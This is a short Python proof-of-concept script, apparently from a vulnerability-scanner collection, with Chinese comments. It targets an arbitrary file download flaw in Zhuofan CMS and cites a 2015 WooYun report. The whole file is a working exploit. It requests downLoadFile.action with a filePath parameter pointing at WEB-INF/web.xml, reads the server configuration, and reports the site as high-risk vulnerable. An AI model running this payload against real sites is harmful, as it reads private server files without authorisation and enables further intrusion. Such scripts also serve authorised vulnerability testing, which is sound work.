#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 卓繁cms任意文件下载漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-54074
author: Lucifer
description: 文件/index/downLoadFile.action中,参数filePath存在任意文件下载。
'''
import sys
import requests



class zhuofan_downLoadFile_download_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/index/downLoadFile.action?fileName=web.xml&filePath=WEB-INF/web.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"<servlet-mapping>" in req.text:
                return "[+]存在卓繁cms任意文件下载漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = zhuofan_downLoadFile_download_BaseVerify(sys.argv[1])
    testVuln.run()